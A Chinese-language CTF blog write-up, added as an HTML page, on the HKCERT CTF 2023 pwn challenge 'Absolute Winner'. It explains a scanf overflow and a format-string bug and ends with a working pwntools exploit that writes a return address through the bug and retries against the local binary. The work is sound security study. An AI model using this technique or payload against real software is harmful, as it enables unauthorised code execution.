@@ -1,0 +1,81 @@
+<!doctype html>
+<html lang="zh-CN" data-base="/">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HKCERT CTF 2023 - ［Absolute Winner］ · Y0uYuGe</title>
+<meta name="description" content="这道题在我看来非常离谱（我比较菜）。">
+<link rel="stylesheet" href="/blog/article.css">
+</head>
+<body data-page="article">
+<header class="bar">
+  <a class="brand" href="/">Y0uYuGe</a>
+  <a class="tomap" href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/2023/HKCERT%20CTF%202023%20-%20%EF%BC%BBAbsolute%20Winner%EF%BC%BD" title="在导图上看这篇文章的位置">◎ 在导图中查看</a>
+</header>
+<div class="wrap">
+  <main class="post">
+    <nav class="crumbs"><a href="/#/">Y0uYuGe</a><span class="sep">›</span><a href="/#/endpoint-security">终端安全</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn">CTF 与 Pwn</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups">题解</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/2023">2023 年</a></nav>
+    <h1>HKCERT CTF 2023 - ［Absolute Winner］</h1>
+    <div class="meta"><time>2023-11-13</time><span class="tag">#学习</span><span class="tag">#Pwn</span><span class="tag">#CTF</span></div>
+    <article class="post-body">
+<h1 id="前言">前言</h1>
+<p>这道题在我看来非常离谱（我比较菜）</p>
+<h2 id="ida">IDA</h2>
+<p>首先，IDA 在这里感觉有点拉胯
+反汇编里完全没有 strcpy……它凭空反编译出了一个 strcpy 函数，但汇编本身是没问题的
+&quot;You are cheating&quot; 和 &quot;Bye&quot; 这两个字符串被放在栈上，是直接写入的；这两个字符串不在全局变量里（难怪字符串搜索没找到）
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2023/HKCERT%20CTF%202023%20-%20%EF%BC%BBAbsolute%20Winner%EF%BC%BD/assets/csdn-134375800/image-001-d2d48ad342.png" alt="图片">
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2023/HKCERT%20CTF%202023%20-%20%EF%BC%BBAbsolute%20Winner%EF%BC%BD/assets/csdn-134375800/image-002-0b221b1c2e.png" alt="图片"></p>
+<h2 id="movabsq">movabsq</h2>
+<p>movabsq 是一个新加入的指令，用于把一个 64 位的值直接存入一个 64 位寄存器</p>
+<h2 id="ja">ja</h2>
+<p>JA（jump above）是大于则跳转，它比较两个无符号数的大小关系，大于就跳转</p>
+<h2 id="pretty_alert">pretty_alert</h2>
+<p>这个鬼函数用了 printf，其中一次 printf 调用把 pretty_alert 的第一个参数作为自己的第一个参数，这里可以利用格式化字符串漏洞（这一点可以从输出和动态调试中发现）</p>
+<h2 id="scanfss">scanf(&quot;%s&quot;,s)</h2>
+<p>明显的溢出……</p>
+<h1 id="开始-pwn">开始 pwn</h1>
+<p>所有保护都开了（国外赛题的常规操作）
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2023/HKCERT%20CTF%202023%20-%20%EF%BC%BBAbsolute%20Winner%EF%BC%BD/assets/csdn-134375800/image-003-8794324c00.png" alt="图片">
+正常逻辑绕不过 exit，只能用 printf 的格式化字符串，但 exit 之前只能 printf 一次，所以必须绕过 exit。pretty_alert 和 exit(0) 紧挨着——为什么不用 printf 的任意写去改 pretty_alert 的返回地址呢？</p>
+<h1 id="随机化">随机化</h1>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2023/HKCERT%20CTF%202023%20-%20%EF%BC%BBAbsolute%20Winner%EF%BC%BD/assets/csdn-134375800/image-004-9205d748c8.png" alt="图片">
+八个字节会变化，但最低四位始终保持不变</p>
+<h1 id="思路">思路</h1>
+<p>溢出可以修改后面变量的值
+找到了一条可利用的 rbp 链；嵌套两轮就够了
+第一轮嵌套把栈上某个位置的值改为返回地址所在的地址
+第二轮嵌套把该返回地址所在位置的实际内容改为输出 flag 的那个函数</p>
+<p>但要注意，在一次 printf 中，第一次修改的内容可能还没来得及更新就要用于第二次修改，所以</p>
+<h1 id="exp">exp</h1>
+<pre><code class="language-python">from pwn import *
+
+while True:
+    try: 
+        r=process(&quot;./chall&quot;)
+        #gdb.attach(r,&quot;b main&quot;)
+        #r = remote(&#39;chal.hkcert23.pwnable.hk&#39;, 28246)
+        #r.clean()
+        
+        r.sendline(b&#39;Y\x00&#39;.ljust(0x2b, b&#39;A&#39;) + b&#39;%c%c%c%c%c%c%c%c%c%c%46c%8$hhn%119c%22$hhn&#39;)
+        r.sendline(b&#39;1&#39;)
+        r.sendline(b&#39;1&#39;)
+        r.recvuntil(b&#39;The flag is &#39;)
+        r.interactive()
+        break
+    except KeyboardInterrupt:
+        break
+    except EOFError:
+        r.close()
+    
+</code></pre>
+
+    </article>
+    
+    <nav class="pn"><a href="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2023/2023%20WMCTF%20pwn%20%E9%A2%98%E8%A7%A3%20%5Bblindless%20jit%5D/"><span class="l">上一篇</span>2023 WMCTF pwn 题解 [blindless jit]</a><a href="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2023/TSG%20CTF%202023%20%5BBABA%20PWN%20GAME%5D/"><span class="l">下一篇</span>TSG CTF 2023 [BABA PWN GAME]</a></nav>
+  </main>
+  <aside class="toc"><div class="toc-h">目录</div><a class="d2" href="#ida">IDA</a><a class="d2" href="#movabsq">movabsq</a><a class="d2" href="#ja">ja</a><a class="d2" href="#pretty_alert">pretty_alert</a><a class="d2" href="#scanfss">scanf(&amp;quot;%s&amp;quot;,s)</a></aside>
+</div>
+<script type="module" src="/blog/article.js"></script>
+</body>
+</html>
